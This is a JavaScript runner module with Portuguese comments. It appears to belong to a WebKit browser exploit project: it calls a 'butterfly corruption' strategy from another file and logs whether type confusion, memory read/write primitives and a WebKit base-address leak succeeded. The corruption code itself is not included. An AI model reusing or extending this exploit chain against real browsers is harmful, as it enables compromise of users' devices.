// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R44-Butterfly)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeButterflyCorruptionStrategy_R44,
    FNAME_MODULE_BUTTERFLY_CORRUPTION_R44
} from './testArrayBufferVictimCrash.mjs';

async function runButterflyCorruptionStrategy_R44() {
    const FNAME_RUNNER = "runButterflyCorruptionStrategy_R44_Runner";
    logS3(`==== INICIANDO Estratégia de Corrupção de Butterfly (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    // Chama a nova função de teste do outro módulo
    const result = await executeButterflyCorruptionStrategy_R44();

    const module_name_for_title = FNAME_MODULE_BUTTERFLY_CORRUPTION_R44;

    if (result.error) {
        logS3(`  RUNNER R44: Teste principal capturou ERRO: ${result.error}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else {
        logS3(`  RUNNER R44: Teste completado.`, "good", FNAME_RUNNER);
        logS3(`    - Confusão de Tipos e Corrupção: ${result.tc_confirmed ? "SUCESSO" : "FALHA"}`, result.tc_confirmed ? "good" : "error", FNAME_RUNNER);
        logS3(`    - Construção de Primitivas: ${result.primitives_built ? "SUCESSO" : "FALHA"}`, result.primitives_built ? "good" : "error", FNAME_RUNNER);
        logS3(`    - Auto-Teste das Primitivas: ${result.primitives_tested_ok ? "SUCESSO" : "FALHA"}`, result.primitives_tested_ok ? "good" : "error", FNAME_RUNNER);
        logS3(`    - Vazamento da Base do WebKit: ${result.webkit_leak_ok ? "SUCESSO" : "FALHA"}`, result.webkit_leak_ok ? "vuln" : "error", FNAME_RUNNER);
        
        if (result.webkit_base_candidate) {
            logS3(`    - Base do WebKit Candidata: ${result.webkit_base_candidate}`, "leak", FNAME_RUNNER);
        }

        if (result.success && result.webkit_leak_ok) {
            document.title = `${module_name_for_title}: WebKitLeak SUCCESS!`;
        } else if (result.primitives_tested_ok) {
            document.title = `${module_name_for_title}: Primitives OK, Leak Fail`;
        } else if (result.tc_confirmed) {
            document.title = `${module_name_for_title}: TC OK, Primitives Fail`;
        } else {
            document.title = `${module_name_for_title}: TC Fail`;
        }
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Corrupção de Butterfly (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_BUTTERFLY_CORRUPTION_R44}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R44 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    // Chama o novo runner
    await runButterflyCorruptionStrategy_R44();
    
    logS3(`\n==== Script 3 R44 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    
    // Atualiza o título final se não foi definido com sucesso/falha explícita
    if (document.title.includes(FNAME_MODULE_BUTTERFLY_CORRUPTION_R44) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK")) {
        document.title = `${FNAME_MODULE_BUTTERFLY_CORRUPTION_R44}_Done`;
    }
}
